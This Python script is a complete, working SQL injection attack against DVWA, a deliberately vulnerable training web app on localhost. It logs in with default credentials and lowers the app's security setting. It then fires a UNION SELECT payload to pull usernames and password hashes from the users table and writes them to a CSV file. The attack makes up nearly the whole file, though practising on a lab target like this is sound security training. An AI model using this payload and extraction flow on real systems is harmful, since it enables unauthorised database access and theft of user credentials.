import requests
from bs4 import BeautifulSoup
import time
from datetime import timedelta
import os
from tqdm import tqdm

def format_time(seconds):
    return str(timedelta(seconds=int(seconds)))

def get_csrf_token(session, url):
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'})
    return user_token['value'] if user_token else None

def login_to_dvwa(session):
    login_url = "http://localhost/dvwa/login.php"
    
    # Get CSRF token for login
    csrf_token = get_csrf_token(session, login_url)
    if not csrf_token:
        print("[ERROR] Failed to get CSRF token for login")
        return False
        
    # Login with default credentials
    login_data = {
        'username': 'admin',
        'password': 'password', 
        'Login': 'Login',
        'user_token': csrf_token
    }
    
    response = session.post(login_url, data=login_data)
    if 'index.php' in response.url:
        print("[SUCCESS] Successfully logged into DVWA")
        return True
    print("[ERROR] Failed to login to DVWA")
    return False

def setup_dvwa(session):
    # Set security level to low
    security_url = "http://localhost/dvwa/security.php"
    response = session.get(security_url)
    
    # Get CSRF token for security page
    csrf_token = get_csrf_token(session, security_url)
    if csrf_token:
        security_data = {
            'security': 'low',
            'seclev_submit': 'Submit',
            'user_token': csrf_token
        }
        session.post(security_url, data=security_data)
    
    # Double check it's set
    session.cookies.set('security', 'low')
    print("[INFO] Security level set to: low")

def try_payload(session, target_url, payload):
    print(f"\n[INFO] Testing payload: {payload}")
    
    try:
        # Get CSRF token if needed
        csrf_token = get_csrf_token(session, target_url)
        
        # Send the payload
        params = {
            'id': payload, 
            'Submit': 'Submit'
        }
        if csrf_token:
            params['user_token'] = csrf_token
            
        response = session.get(target_url, params=params)
        print(f"[INFO] Response status: {response.status_code}")
        
        # Parse and display results
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # DVWA shows results in pre tags
        pre_tags = soup.find_all('pre')
        for pre in pre_tags:
            content = pre.get_text().strip()
            if 'ID:' in content and 'First name:' in content:
                print("\n[SUCCESS] Data extracted:")
                print(content)
                return True
        # If no results found, check if there's an error that might help us
        if 'SQL syntax' in response.text:
            print("[WARNING] SQL syntax error detected - query might need adjustment")
        else:
            print("[INFO] No results found in response")
            
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {str(e)}")
    return False

def save_credentials(found_data):
    # Create output directory if it doesn't exist
    output_dir = '../output'
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    # Format and save credentials
    output_file = os.path.join(output_dir, f'dvwa_credentials.csv')
    
    with open(output_file, 'w') as f:
        # Write header
        f.write("username;password\n")
        
        # Process each result set
        for data in found_data:
            if 'First name:' in data and 'Surname:' in data:
                # Extract username and password from the result
                parts = data.split('First name: ')[1].split('Surname: ')
                if len(parts) == 2:
                    username = parts[0].strip()
                    password = parts[1].strip()
                    f.write(f"{username};{password}\n")
    
    print(f"[SUCCESS] Credentials saved to: {output_file}")

def perform_sql_injection():
    print("\n" + "="*50)
    print("SQL INJECTION ATTACK")
    print("="*50 + "\n")
    
    total_start_time = time.time()
    successful_payloads = []
    found_data = []
    
    # Setup session
    session = requests.Session()
    
    # Login first
    if not login_to_dvwa(session):
        return
    
    # Setup DVWA security
    setup_dvwa(session)
    
    target_url = "http://localhost/dvwa/vulnerabilities/sqli/"
    
    # First get the page to ensure we have a valid session
    initial_response = session.get(target_url)
    if initial_response.status_code == 200:
        print("[SUCCESS] Successfully accessed SQL injection page")
    else:
        print(f"[ERROR] Failed to access target page (status: {initial_response.status_code})")
        return
    
    # Use the working payload for user-password extraction
    payloads = [
        "' UNION SELECT user, password FROM users#"  # Get usernames and password hashes
    ]
    
    print("\nStarting SQL injection attack...")
    
    try:
        for payload in tqdm(payloads, desc="Testing payloads", unit="payload"):
            if try_payload(session, target_url, payload):
                successful_payloads.append(payload)
                
                # Store the found data for summary
                response = session.get(target_url, params={'id': payload, 'Submit': 'Submit'})
                soup = BeautifulSoup(response.text, 'html.parser')
                for pre in soup.find_all('pre'):
                    found_data.append(pre.get_text().strip())
                
            time.sleep(1)  # Be nice to the server
            
    except KeyboardInterrupt:
        print("\n[INFO] SQL injection testing interrupted by user")
    except Exception as e:
        print(f"\n[ERROR] An unexpected error occurred: {str(e)}")
    finally:
        total_time = time.time() - total_start_time
        
        print("\n" + "="*50)
        print("SQL INJECTION SUMMARY")
        print("="*50)
        print(f"\nExecution time: {format_time(total_time)}")
        print(f"Payloads tested: {len(payloads)}")
        print(f"Successful payloads: {len(successful_payloads)}")
        
        if successful_payloads:
            print("\nWorking SQL Injections:")
            for i, payload in enumerate(successful_payloads, 1):
                print(f"[+] {payload}")
            
            print("\nExtracted Data:")
            for i, data in enumerate(found_data, 1):
                print(f"\nResult Set {i}:")
                print(data)
            
            # Save credentials to file
            save_credentials(found_data)
        else:
            print("\n[WARNING] No successful SQL injections found")
        
        print("\n" + "="*50)

if __name__ == "__main__":
    perform_sql_injection()
